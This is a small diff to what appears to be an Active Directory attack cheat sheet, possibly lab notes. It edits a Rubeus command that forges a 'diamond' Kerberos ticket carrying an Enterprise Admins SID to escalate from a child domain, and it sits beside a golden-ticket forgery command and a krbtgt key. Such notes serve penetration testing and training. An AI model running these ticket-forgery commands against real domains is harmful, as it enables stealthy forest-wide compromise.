@@ -43,7 +43,7 @@ ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.conto
 
 Create diamond ticket (OPSEC SAFE) or a golden ticket offline - `/sids` = child domain
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-2958544638-1589230383-838459903-519 /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-1076548718-1118529210-2193484809-519 /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /nowrap
 
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:[Child SID] /sids:[Parent EA GROUP SID] /aes256:[Child KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden
 ```
